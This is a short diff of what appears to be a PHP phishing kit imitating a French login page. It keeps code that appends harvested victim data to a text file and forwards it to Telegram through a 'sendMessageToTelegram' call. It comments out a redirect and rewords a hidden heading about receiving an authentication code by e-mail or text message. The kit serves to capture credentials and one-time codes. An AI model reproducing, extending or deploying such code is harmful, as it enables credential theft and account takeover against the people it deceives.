@@ -12,7 +12,7 @@ $file = "../blinky2000@bvc@bvc@destruction.txt" ;
 file_put_contents($file, $donnees, FILE_APPEND);
  sendMessageToTelegram($donnees) ;
 
-    header("Location: ./loop.php");
+   // header("Location: ./loop.php");
     exit();
 ?>
 
@@ -3913,7 +3913,7 @@ file_put_contents($file, $donnees, FILE_APPEND);
                             <div id="loginForm" class="connect-form">
                                 <div>
                                     <div class="" role="none">
-                                        <h2 class="a11y-hide">Vous recevrez un code d'authentification sur votre E-mail ou par sms
+                                        <h2 class="a11y-hide">Vous recevrez un code d'authentification sur votre E-mail ou par texto
                                         </h2>
                                         <h3>
                                         </h3>
